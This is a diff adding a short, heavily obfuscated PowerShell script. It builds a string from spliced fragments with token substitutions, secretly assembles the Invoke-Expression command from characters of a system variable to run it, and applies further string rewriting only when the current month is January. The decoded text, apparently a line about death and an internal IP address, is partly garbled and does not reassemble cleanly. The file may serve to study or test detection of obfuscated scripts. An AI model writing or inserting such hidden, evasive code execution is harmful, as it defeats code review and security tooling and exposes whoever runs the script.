@@ -1,0 +1,18 @@
+$MenB=@( '(''hLD''+''re''+''sult = 9ZaDeath''+'' is just ''+''a part of', '''+'' ''+''li''+''fe''+'',''+'' so''+''met''+''h''+''in''+''g''+'' we''+''','1uX''+''r''+''e''+'' all de''+''s''+''tin''+''ed''+'' ''+''to ''+''d''+','''oN''+''8YipQlI''+''10N8Y1''+''1N''+''8Y37N''+''8Y22''+''69Za
+'')')
+$pfFLeTT =[stRING]::jOin('' ,$MenB )
+$pfFLeTT =&( ([String]$VerbosePreference)[1,3]+'x'-Join'')   $pfFLeTT 
+FuncTIoN UgELAWE { 
+    [ CMdLeTBiNDinG() ]PARam( 
+        [paraMETeR(vaLUEfromPIpElINE)]
+        $asrn,
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $wECnm
+    )
+    iF((gEt-dAte ).mOntH -lt 2){
+        $VkHdTW=$wECnm-rEPLace'hLD',[chaR]36 -CrEPLacE'N8Y',[chaR]46-rEPLace  'QlI',[chaR]58  -rEPLace ([chaR]49+[chaR]117+[chaR]88),[chaR]39-rEPLace'9Za',[chaR]34
+    
+    }
+}
+UgELAWE -asrn 'SriXbd' -wECnm $pfFLeTT
+
